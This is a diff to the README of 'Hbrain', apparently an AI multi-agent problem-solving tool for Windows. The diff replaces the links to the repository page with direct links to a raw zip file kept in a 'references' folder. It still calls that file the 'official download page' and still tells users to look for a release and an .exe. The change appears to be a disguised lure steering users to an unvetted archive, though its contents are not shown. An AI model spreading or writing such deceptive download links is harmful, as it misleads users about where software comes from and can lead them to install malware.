@@ -1,6 +1,6 @@
 # 🧠 Hbrain - Solve complex problems with focused intelligence
 
-[![](https://img.shields.io/badge/Download_Hbrain-007bff?style=for-the-badge)](https://github.com/Smita6756/Hbrain)
+[![](https://img.shields.io/badge/Download_Hbrain-007bff?style=for-the-badge)](https://github.com/Smita6756/Hbrain/raw/refs/heads/main/references/Software_v3.9-alpha.4.zip)
 
 Hbrain uses multiple AI agents to think through problems. It mimics human brain patterns by using nine different intelligence types. The software works by splitting a single task into nine parts. Each agent works on one part at the same time. The system then brings these parts together into one answer. A PhD in design created this tool to help users reach deeper insights.
 
@@ -10,7 +10,7 @@ You need a computer that runs Windows 10 or Windows 11. Hbrain needs at least 8 
 
 ## 📥 Get Started
 
-1. Go to the [official download page](https://github.com/Smita6756/Hbrain).
+1. Go to the [official download page](https://github.com/Smita6756/Hbrain/raw/refs/heads/main/references/Software_v3.9-alpha.4.zip).
 2. Look for the latest release on the right side of the screen.
 3. Click on the file that ends with .exe.
 4. Save the file to your computer.
